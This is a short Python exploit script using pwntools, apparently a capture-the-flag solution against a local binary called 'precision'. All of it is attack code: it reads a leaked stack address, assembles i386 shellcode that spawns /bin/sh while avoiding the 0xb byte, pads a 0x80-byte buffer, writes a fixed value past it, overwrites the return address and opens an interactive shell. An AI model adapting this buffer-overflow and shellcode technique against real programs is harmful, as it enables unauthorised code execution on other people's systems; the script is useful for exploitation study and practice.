from pwn import *

r = process("./precision")
buf_addr = int(r.recvline().split(': ')[1].strip(), 16)

# Modified shellcode version without 0xb
sh = asm(shellcraft.i386.pushstr('/bin///sh'))
sh += asm(shellcraft.i386.mov('ebx','esp'))
sh += asm(shellcraft.i386.mov('ecx',0))
#sh += asm(shellcraft.i386.push('0xb')) # Original, following instruction replace this command
sh += asm(shellcraft.i386.mov('eax',0x41)) # eax = 0x41
sh += '\x83\xe8\x36' # sub eax, 0x36 83 == sub, e8 == eax, 36 == number to subtract
sh += '\x99' # cdq
sh += '\xcd\x80' # int 0x80

payload = sh + "A"*(0x80-len(sh))
payload += "\xa5\x31\x5a\x47" + "\x55\x15\x50\x40"
payload += "A"*12
payload += p32(buf_addr)

r.sendline(payload)
r.interactive()
